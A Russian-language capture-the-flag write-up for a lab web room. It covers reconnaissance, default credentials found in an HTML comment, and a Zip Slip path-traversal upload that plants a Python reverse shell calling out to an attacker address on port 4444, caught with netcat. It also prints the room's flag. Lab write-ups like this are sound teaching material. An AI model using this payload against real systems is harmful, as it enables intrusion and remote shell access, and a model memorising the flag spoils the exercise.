**Теги:** Web.
**Сложность:** Medium.

# Room 10 — The Hollow Shell

## 1. Разведка

Цель:

```text
10.112.128.138
```

Первоначально казалось, что веб-страницы нет, поэтому начинаем с Nmap:

```bash
sudo nmap -sS -sV 10.112.128.138
```

Получаем:

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-06 06:54 EDT
Nmap scan report for 10.112.128.138
Host is up (0.087s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Gunicorn
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Открыты два порта:

```text
22/tcp   SSH
5000/tcp HTTP — Gunicorn
```

---

## 2. Исследование веб-приложения

Проверяем порт `5000`:

```bash
curl -l http://10.112.128.138:5000
```

Сервер отвечает редиректом:

```text
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
```

Переход ведёт на:

```text
/login
```

---

## 3. Поиск учётных данных

Получаем содержимое страницы:

```bash
curl -l http://10.112.128.138:5000/login
```

В HTML страницы обнаруживается комментарий:

```html
<!--
───────────────────────────────────────────────────────────────
 Byte Lotus // internal display-manager portal
 New on the floor team? IT seeds every property with the same
 starter login until you set your own:
     user: concierge
     pass: StayNoticed2024!
 (rotate it from Settings on first sign-in — most people forget)
───────────────────────────────────────────────────────────────
-->
```

Таким образом, в исходном коде страницы находятся начальные credentials:

```text
Username: concierge
Password: StayNoticed2024!
```

---

## 4. Авторизация

Используем найденные credentials:

```bash
curl -i -c cookies.txt \
-X POST http://10.112.128.138:5000/login \
-d "username=concierge&password=StayNoticed2024!"
```

Получаем:

```text
HTTP/1.1 302 FOUND
Server: gunicorn
Location: /dashboard
Vary: Cookie
Set-Cookie: session=eyJzdGFmZiI6ImNvbmNpZXJnZSJ9.anRo0g.ipte9p59bnuT3EN0irV4rn40oEw; HttpOnly; Path=/
```

Сервер успешно авторизует пользователя и перенаправляет его на:

```text
/dashboard
```

Переходим на dashboard:

```bash
curl -b cookies.txt -L http://10.112.128.138:5000/dashboard
```

---

# 5. Анализ функциональности загрузки

На dashboard обнаруживаем функцию загрузки `.zip`:

```html
<h2>Bring a shell ashore</h2>
<p class="lede">
  Found something on the beach? Upload it as a <b>shell</b>
  (a <code style="font-family:var(--mono)">.zip</code> souvenir pack) to set the ambiance on the
  in-room tablets. Each shell must contain a <b>shell.json</b> manifest
  listing its assets (images, stylesheets).
</p>
```

Форма:

```html
<form method="post" action="/upload" enctype="multipart/form-data">
```

Загрузка выполняется через:

```text
/upload
```

Также страница сообщает, что архив может содержать **automation hooks**:

```text
A shell may include optional automation hooks — the theme worker
applies these for you shortly after the shell comes ashore
```

Разрешённые типы assets:

```text
png jpg gif svg css json
```

---

# 6. Проверка обычного ZIP

Создаём простой архив с `shell.json`.

```bash
mkdir shell
cd shell/
cat > shell.json <<'EOF'
{
  "name": "test",
  "assets": []
}
EOF
```

Создаём архив:

```bash
zip -r test.zip shell.json
```

Получаем:

```text
adding: shell.json (deflated 5%)
```

Загружаем:

```bash
curl -b ../cookies.txt \
-F "shell=@test.zip" \
http://10.112.128.138:5000/upload
```

Сервер перенаправляет обратно на dashboard:

```text
HTTP/1.1 Redirecting...
Location: /dashboard
```

После повторного просмотра dashboard видим загруженный shell:

```text
test
shells/21203082b0f1/
```

А после ещё одной загрузки появляется второй:

```text
test
shells/ff7c47a4ee84/
```

Это подтверждает, что сервер принимает ZIP и распаковывает его содержимое.

---

# 7. Проверка automation hooks

Следующим шагом проверяем, можно ли управлять automation hooks через `shell.json`.

Создаём:

```bash
mkdir pwn
cd pwn/
cat > shell.json <<'EOF'
{
  "name": "pwn",
  "assets": [],
  "hooks": {
    "post_install": "id"
  },
  "automation": {
    "command": "id"
  },
  "hook": "id",
  "command": "id"
}
EOF
```

Создаём архив:

```bash
zip -r pwn.zip shell.json
```

Получаем:

```text
adding: shell.json (deflated 39%)
```

Загружаем:

```bash
curl -b ~/Desktop/cookies.txt \
-F "shell=@pwn.zip" \
http://10.112.128.138:5000/upload
```

После этого на dashboard появляется:

```text
pwn
shells/6a1aa1d8dc31/
```

Однако ожидаемого выполнения `id` через эти поля не происходит.

---

# 8. Перечисление директорий

Дополнительно запускаем Gobuster:

```bash
gobuster dir -u http://10.112.128.138:5000 -w ~/HH101/seclists/Discovery/Web-Content/common.txt -x txt,php,py
```

Результат:

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.128.138:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/deb88/HH101/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              py,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/dashboard            (Status: 302) [Size: 199] [--> /login]
/login                (Status: 200) [Size: 1832]
/logout               (Status: 302) [Size: 199] [--> /login]
/upload               (Status: 405) [Size: 153]
Progress: 19008 / 19008 (100.00%)
===============================================================
Finished
```

Таким образом, интересных дополнительных endpoints Gobuster не обнаружил.

---

# 9. Обнаружение Zip Slip

На этом этапе становится понятно, что наиболее интересная часть приложения — обработка загружаемых ZIP-архивов.

Создаём ZIP вручную с помощью Python. В архив помещаем обычный `shell.json`, а вторым объектом — файл с traversal-путём:

```text
../../hooks/callback.py
```

Это позволяет выйти за пределы директории, в которую приложение распаковывает пользовательский архив.

Создаём Python-скрипт:

```python
import zipfile, json

manifest = {"name": "reverse", "assets": []}

callback = '''
import socket, os, pty
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.154.82ATTACKER_IP", 4444))
for fd in (0, 1, 2):
    os.dup2(sock.fileno(), fd)
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../hooks/callback.py", callback)
```

Ключевой момент здесь:

```python
z.writestr("../../hooks/callback.py", callback)
```

Именно `../` позволяет записать файл за пределами ожидаемого каталога распаковки.

Это классическая уязвимость **Zip Slip / Path Traversal при распаковке архива**.

---

# 10. Получение reverse shell

После запуска Python-скрипта получаем:

```text
reverse-shell.zip
```

Запускаем Netcat listener:

```bash
nc -lvnp 4444
```

Получаем:

```text
listening on [any] 4444 ...
connect to [192.168.154.82] from (UNKNOWN) [10.112.128.138] 45448
```

Reverse shell успешно подключается.

Проверяем текущую директорию:

```bash
ls
```

Получаем:

```text
__pycache__  hooks  shells  templates  tmp
app.py  requirements.txt  static  theme_worker.py  venv
```

Текущая директория:

```text
/var/www/conch
```

Пользователь:

```text
roomservice
```

---

# 11. Получение флага

После получения shell исследуем домашнюю директорию:

```text
/home/ubuntu
```

В ней обнаруживаем:

```text
flag.txt
```

Содержимое:

```text
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

---

# Итоговая цепочка

```text
Nmap
  │
  ▼
5000/tcp — Gunicorn
  │
  ▼
/login
  │
  ▼
Credentials в HTML-комментарии
concierge : StayNoticed2024!
  │
  ▼
/dashboard
  │
  ▼
ZIP upload
  │
  ▼
shell.json
  │
  ▼
анализ распаковки ZIP
  │
  ▼
Zip Slip
../../hooks/callback.py
  │
  ▼
запись Python callback
  │
  ▼
reverse shell
  │
  ▼
roomservice@tryhackme-2404
  │
  ▼
/home/ubuntu/flag.txt
  │
  ▼
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

## Flag

```text
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

### Основная уязвимость

**Zip Slip** — приложение небезопасно обрабатывает пути файлов внутри загружаемого ZIP-архива. Использование:

```text
../../hooks/callback.py
```

позволяет записать файл вне предназначенной директории. В данном случае это используется для размещения Python callback, который затем выполняется theme worker и устанавливает reverse shell.
